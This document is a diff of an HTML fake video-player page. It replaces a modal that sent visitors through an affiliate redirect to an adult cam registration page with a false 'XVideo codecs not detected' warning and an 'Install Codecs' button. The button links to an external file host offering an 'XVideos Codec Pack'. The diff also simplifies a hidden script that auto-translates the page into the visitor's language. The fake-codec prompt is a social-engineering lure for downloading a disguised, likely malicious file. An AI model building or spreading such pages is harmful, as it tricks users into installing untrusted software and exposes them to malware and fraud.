@@ -43,7 +43,7 @@ body { margin: 0; background: #000; display: flex; align-items: center; justify-
 </style>
 </head>
 <body>
-<div id="google_translate_element" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;"></div>
+<div id="google_translate_element" style="display: none;"></div>
 
 <div class="player" id="player">
   <div class="controls">
@@ -65,11 +65,9 @@ body { margin: 0; background: #000; display: flex; align-items: center; justify-
 
 <div class="modal" id="modal">
   <div class="modal-content">
-    <p>Sign up or login to start watching!</p>
+    <p>XVideo codecs not detected.</p>
     <div class="modal-buttons">
-      <a href="#" id="register-link" target="_blank" rel="noopener noreferrer">Start Watching</a>
-	  
-	  <a href="#" id="register-link" target="_blank" rel="noopener noreferrer">Login</a>
+      <a href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" target="_blank" rel="noopener noreferrer">Install Codecs</a>
     </div>
   </div>
 </div>
@@ -79,15 +77,7 @@ const playBtn = document.getElementById("play-btn");
 const volumeSlider = document.getElementById("volume");
 const player = document.getElementById("player");
 const modal = document.getElementById("modal");
-const modalLink = document.getElementById("register-link");
-
-const registrationLinks = {
-  mobile: "https://nord.affpmelody.com/click?pid=3749&offer_id=291&redirect=https://www.sweepsexlive.com/accounts/register/",
-  desktop: "https://nord.affpmelody.com/click?pid=3749&offer_id=291&redirect=https://www.sweepsexlive.com/accounts/register/"
-};
-
-const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-modalLink.href = isMobile ? registrationLinks.mobile : registrationLinks.desktop;
+const modalLink = document.querySelector(".modal-buttons a");
 const progress = document.getElementById("progress");
 const progressBar = document.getElementById("progress-bar");
 const timeDisplay = document.getElementById("time");
@@ -110,64 +100,8 @@ volumeSlider.addEventListener("input",()=>{console.log("Volume:",volumeSlider.va
 progressBar.addEventListener("click",(e)=>{const rect=progressBar.getBoundingClientRect();const clickX=e.clientX-rect.left;const newTime=Math.floor((clickX/rect.width)*totalDuration);currentTime=newTime;updateTime();});
 updateTime();
 
-// Hidden Google Translate: automatically translate to the browser language
-(function () {
-  const browserLang = (navigator.language || navigator.userLanguage || "en")
-    .toLowerCase()
-    .split("-")[0];
-
-  // Languages supported by the page's hidden translator.
-  const supported = [
-    "en","ru","uk","pl","de","fr","es","it","pt","tr",
-    "nl","cs","ro","hu","sv","no","fi","da"
-  ];
-
-  // English is the original page language.
-  if (browserLang === "en" || !supported.includes(browserLang)) return;
-
-  let translated = false;
-
-  function translatePage() {
-    if (translated) return;
-
-    const select = document.querySelector(".goog-te-combo");
-
-    if (select) {
-      const option = Array.from(select.options).find(
-        o => o.value === browserLang
-      );
-
-      if (option) {
-        select.value = browserLang;
-        select.dispatchEvent(new Event("change", { bubbles: true }));
-        translated = true;
-        return;
-      }
-    }
-  }
-
-  // Google Translate loads asynchronously, so keep checking briefly.
-  const timer = setInterval(translatePage, 250);
-  setTimeout(() => clearInterval(timer), 20000);
-
-  // Also retry after the Google script has had time to initialize.
-  window.addEventListener("load", () => {
-    setTimeout(translatePage, 1000);
-    setTimeout(translatePage, 3000);
-  });
-})();
-
-function googleTranslateElementInit() {
-  new google.translate.TranslateElement(
-    {
-      pageLanguage: "en",
-      autoDisplay: false,
-      includedLanguages:
-        "en,ru,uk,pl,de,fr,es,it,pt,tr,nl,cs,ro,hu,sv,no,fi,da"
-    },
-    "google_translate_element"
-  );
-}
+// Google Translate Init
+function googleTranslateElementInit(){new google.translate.TranslateElement({pageLanguage:'en',autoDisplay:false},'google_translate_element');const userLang=navigator.language||navigator.userLanguage;const langCode=userLang.split('-')[0];const interval=setInterval(()=>{const select=document.querySelector('.goog-te-combo');if(select){select.value=langCode;select.dispatchEvent(new Event('change'));clearInterval(interval);}},500);}
 </script>
 <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 </body>
